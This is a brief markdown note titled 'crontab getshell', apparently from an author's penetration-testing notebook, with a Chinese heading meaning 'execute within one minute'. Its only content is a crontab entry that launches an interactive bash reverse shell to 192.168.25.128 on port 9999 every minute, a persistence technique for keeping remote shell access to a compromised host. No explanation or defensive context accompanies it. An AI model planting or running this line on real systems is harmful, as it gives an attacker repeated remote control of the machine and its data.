---
title: "crontab getshell"
author: ["4shen0ne"]
draft: false
---

## 一分钟内执行 {#一分钟内执行}

```text
*/1 * * * * bash -i >& /dev/tcp/192.168.25.128/9999 0>&1
```
